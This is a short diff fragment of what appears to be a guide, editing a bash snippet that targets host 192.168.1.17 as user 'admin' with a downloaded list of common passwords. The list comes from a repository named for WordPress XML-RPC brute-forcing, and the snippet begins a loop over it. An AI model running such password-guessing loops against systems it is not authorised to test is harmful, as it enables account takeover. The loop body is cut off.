@@ -95,9 +95,9 @@ done < $dictionary
 If you do not desire to download anything then you can use the following script
 
 ```bash
-export HOST='192.168.1.17';
-export USERNAME='admin';
-export DICTIONARY=($(curl -s "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"));
+HOST='192.168.1.17'
+USERNAME='admin'
+DICTIONARY=($(curl -s "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"))
 
 for i in ${!DICTIONARY[@]};
 do
